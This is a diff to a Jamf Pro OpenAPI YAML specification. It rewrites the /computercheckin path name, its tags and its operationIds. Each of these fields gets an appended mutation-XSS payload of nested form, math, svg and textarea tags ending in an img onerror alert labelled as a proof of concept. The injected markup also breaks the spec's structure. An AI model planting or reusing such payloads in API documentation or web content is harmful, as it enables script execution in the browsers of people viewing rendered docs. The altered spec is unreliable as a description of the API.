@@ -1130,22 +1130,27 @@ paths:
       description: 'Displays application usage information for the date range specified for a computer specified with the {udid} parameter.  Date range must be specified in format yyyy-mm-dd.  For example, ../JSSResource/computerapplicationusage/udid/ABC1FE75-144A-5F66-944B-8D37B6CFABCD/2016-01-01_2016-12-31'
       operationId: findComputerApplicationUsageByUDID
       summary: Finds computer application usage by computer UDID
-  /computercheckin:
+  /computercheckin <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - computercheckin
-      operationId: findComputerCheckin
+        - computercheckin <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+
+      operationId: findComputerCheckin <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+
       summary: Finds the Jamf Pro computer checkin information
     put:
       responses:
         '200':
           description: No response was specified
       tags:
-        - computercheckin
-      operationId: updateComputerCheckin
+        - computercheckin <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+
+      operationId: updateComputerCheckin <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+
       summary: Updates the Jamf Pro computer checkin information
   /computercommands:
     get:
